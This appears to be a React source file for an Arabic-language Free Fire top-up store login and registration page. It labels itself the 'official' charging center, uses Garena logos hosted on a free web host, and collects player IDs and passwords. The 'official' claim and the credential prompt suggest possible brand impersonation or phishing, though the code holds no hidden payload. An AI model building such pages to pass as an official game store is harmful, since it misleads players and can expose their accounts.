import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { motion } from 'motion/react';
import { Globe, ChevronDown } from 'lucide-react';
import LoaderButton from '../components/LoaderButton';
import Modal from '../components/Modal';

export default function LoginRegister() {
  const [isLogin, setIsLogin] = useState(true);
  const [accountId, setAccountId] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [banInfo, setBanInfo] = useState<{isOpen: boolean, msg: string}>({isOpen: false, msg: ''});
  
  const navigate = useNavigate();

  useEffect(() => {
    const token = localStorage.getItem('ff_token');
    if (token) {
      navigate('/dashboard');
    }
  }, [navigate]);

  const handleAuth = async () => {
    if (!accountId || !password) {
      setError('يرجى ملأ جميع الحقول');
      return;
    }
    
    setLoading(true);
    setError('');
    
    try {
      const endpoint = isLogin ? '/api/login' : '/api/register';
      const res = await axios.post(endpoint, { account_id: accountId, password });
      
      localStorage.setItem('ff_token', res.data.token);
      localStorage.setItem('ff_user', JSON.stringify(res.data.user));
      navigate('/dashboard');
    } catch (err: any) {
      if (err.response?.status === 403 && err.response?.data?.status === 'banned') {
        setBanInfo({ isOpen: true, msg: err.response.data.message });
      } else {
        setError(err.response?.data?.message || 'فشل في عملية الاتصال');
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] pb-20 font-sans" dir="rtl">
      {/* Header */}
      <header className="sticky top-0 z-40 bg-white shadow-sm">
        <div className="mx-auto flex h-16 max-w-4xl items-center justify-between px-4">
          <div className="flex items-center gap-3">
            <div className="mx-auto flex h-10 w-10 items-center justify-center overflow-hidden rounded-md border border-gray-100 bg-white shadow-sm">
              <img
                src="https://storingo.lovestoblog.com/garena.png"
                alt="Garena"
                className="h-full w-full object-contain p-1"
                onError={(e) => {
                  e.currentTarget.style.display = "none";
                }}
              />
            </div>
            <div className="leading-tight">
              <div className="text-sm font-bold text-gray-800">مركز الشحن</div>
              <div className="text-xs font-semibold text-gray-500">الرسمي</div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors">
              <Globe className="h-4 w-4" />
              <span>الجزائر - العربية</span>
              <ChevronDown className="h-4 w-4" />
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-md px-4 pt-10">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="rounded-2xl border border-gray-100 bg-white p-6 shadow-sm"
        >
          <div className="mb-6 text-center">
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center overflow-hidden rounded-2xl border-2 border-red-600 p-0.5 shadow-md bg-white">
              <img
                src="https://storingo.lovestoblog.com/ff.png"
                alt="Free Fire"
                className="h-full w-full rounded-xl object-cover"
                onError={(e) =>
                  (e.currentTarget.src =
                    "https://play-lh.googleusercontent.com/NejsQExEa0ZqV4xOMr0HjWd2mK95P_k1Gq-U2xI2qXYR0z8C6rE8lQ6YIIf4rY1R3W8=w240-h480-rw")
                }
              />
            </div>
            <h1 className="mb-1 text-2xl font-black text-gray-900">متجر فري فاير</h1>
            <p className="text-sm text-gray-500">
              {isLogin ? 'سجل الدخول لبدء الشحن' : 'أنشئ حسابك لبدء الشحن'}
            </p>
          </div>

          <div className="space-y-4">
            <div>
              <label className="mb-1.5 block text-sm font-bold text-gray-700">معرّف اللاعب</label>
              <input 
                type="text" 
                value={accountId}
                onChange={(e) => setAccountId(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
                placeholder="يرجى إدخال معرّف اللاعب"
              />
            </div>
            <div>
              <label className="mb-1.5 block text-sm font-bold text-gray-700">كلمة المرور</label>
              <input 
                type="password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
                placeholder="••••••••"
              />
            </div>

            {error && <p className="text-center text-sm font-bold text-red-500">{error}</p>}

            <LoaderButton 
              isLoading={loading}
              onClick={handleAuth}
              className="mt-2 w-full rounded-xl bg-red-600 py-4 text-lg font-bold text-white shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all transition-colors"
            >
              {isLogin ? 'تسجيل الدخول' : 'إنشاء حساب جديد'}
            </LoaderButton>

            <div className="mt-4 text-center text-sm font-semibold text-gray-500">
              {isLogin ? 'ليس لديك حساب؟ ' : 'لديك حساب بالفعل؟ '}
              <button 
                onClick={() => { setIsLogin(!isLogin); setError(''); }}
                className="text-red-600 hover:underline"
              >
                {isLogin ? 'إنشاء حساب جديد' : 'تسجيل الدخول'}
              </button>
            </div>
          </div>
        </motion.div>
      </main>

      <Modal 
        isOpen={banInfo.isOpen} 
        onClose={() => setBanInfo({ ...banInfo, isOpen: false })}
        title="الحساب محظور!"
        type="error"
      >
        <div className="text-center">
          <p className="mb-6">{banInfo.msg}</p>
          <button 
            onClick={() => setBanInfo({ ...banInfo, isOpen: false })}
            className="w-full rounded-xl bg-gray-100 text-gray-900 py-3 font-bold hover:bg-gray-200 transition-colors"
          >
            إغلاق
          </button>
        </div>
      </Modal>
    </div>
  );
}
